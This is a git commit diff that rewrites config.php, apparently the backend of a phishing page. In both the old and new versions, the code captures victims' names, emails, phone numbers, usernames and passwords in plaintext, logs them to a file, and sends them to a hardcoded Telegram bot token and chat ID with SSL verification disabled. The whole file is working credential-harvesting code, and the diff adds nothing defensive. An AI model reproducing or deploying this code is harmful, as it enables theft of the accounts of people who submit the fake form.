608a14c663a07bb8471163010e1dd81a1ba24fb9
Serafim <140160676+Serafim-7@users.noreply.github.com>
2023-12-30 22:14:26 +0300

    Update config.php

--- config.php
+++ config.php
@@ -1,54 +1,55 @@
-<?php 
+<?php
 
-extract($_REQUEST);
-$file=fopen("Log1.txt","a");
+// Check if the form is being submitted using the POST method
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    // Sanitize and validate form data
+    $fname = isset($_POST["fname"]) ? htmlspecialchars($_POST["fname"]) : "";
+    $email = isset($_POST["email"]) ? filter_var($_POST["email"], FILTER_SANITIZE_EMAIL) : "";
+    $tele = isset($_POST["tele"]) ? htmlspecialchars($_POST["tele"]) : "";
+    $username = isset($_POST["username"]) ? htmlspecialchars($_POST["username"]) : "";
+    $password1 = isset($_POST["password1"]) ? $_POST["password1"] : ""; // Consider using password_hash() for secure storage
+    $password2 = isset($_POST["password2"]) ? $_POST["password2"] : ""; // Consider using password_verify() for secure retrieval
 
-fwrite($file,"############ \n");
-fwrite($file, ">Firstname: ");
-fwrite($file,$fname."\n");
-fwrite($file, ">Email: ");
-fwrite($file,$email ."\n");
-fwrite($file,">Tele: ");
-fwrite($file,$tele ."\n");
-fwrite($file, ">Username: ");
-fwrite($file,$username ."\n");
-fwrite($file, ">Password1: ");
-fwrite($file,$password1 ."\n");
-fwrite($file, ">Password2: ");
-fwrite($file,$password2 ."\n");
+    // Write the form data to a log file
+    $file = fopen("Log.txt", "a");
+    if ($file) {
+        fwrite($file, "############ \n");
+        fwrite($file, ">Firstname: " . $fname . "\n");
+        fwrite($file, ">Email: " . $email . "\n");
+        fwrite($file, ">Tele: " . $tele . "\n");
+        fwrite($file, ">Username: " . $username . "\n");
+        fwrite($file, ">Password1: " . $password1 . "\n");
+        fwrite($file, ">Password2: " . $password2 . "\n");
+        fwrite($file, "############ \n\n");
+        fclose($file);
+    }
 
-fwrite($file,"############ \n");
+    // Notify through Telegram (if enabled)
+    $telegramEnabled = true; // Set to true if Telegram notification is enabled
+    if ($telegramEnabled) {
+        $chatId = "5258142426"; // Your chat ID
+        $botUrl = "6794346246:AAF_0zUfZd2aMHU7zK2I3_fCL7-ablTxNBo"; // Your bot API URL
 
-fwrite($file, "\n");
-fclose($file);
+        $txt = " ##### \n" . $fname . "\n" . $email . "\n" . $tele . "\n" . $username . "\n" . $password1 . "\n" . $password2 . "\n";
+        
+        $send = ['chat_id' => $chatId, 'text' => $txt];
+        $ch = curl_init($botUrl . '/sendMessage');
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $result = curl_exec($ch);
+        curl_close($ch);
+    }
 
-$telegram="on";
-$f=$_POST["fname"];
-$e=$_POST["email"];
-$t=$_POST["tele"];
-$u=$_POST["username"];
-$p1=$_POST["password1"];
-$p2=$_POST["password2"];
-
-$data=" ##### \n  $f \n $e \n $t \n $u \n $p1 \n $p2 \n";
-
-$txt=$data;
-$chat_id="5258142426"; // my chat id
-$bot_url="6794346246:AAF_0zUfZd2aMHU7zK2I3_fCL7-ablTxNBo"; // bot api 
-
-if ($telegram=="on") {
-  $send=['chat_id'=> $chat_id, 'text'=>$txt];
-  $website="https://api.telegram.org/{$bot_url}";
-  $ch=curl_init($website.'/sendMessage');
-  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
-  curl_setopt($ch,CURLOPT_POST,1);
-  curl_setopt($ch,CURLOPT_POSTFIELDS,($send));
-  curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
-  $result = curl_exec($ch);
-  curl_close($ch);
+    // Redirect after processing the form
+    header("location: signup.html");
+    exit; // Terminate script execution
+} else {
+    // Handle non-POST requests (if needed)
+    http_response_code(405); // Method Not Allowed
+    // You can provide an error message or a redirect to the valid form submission page
+    exit;
 }
-
-
-header("location:signu.html");
-
 ?>
+
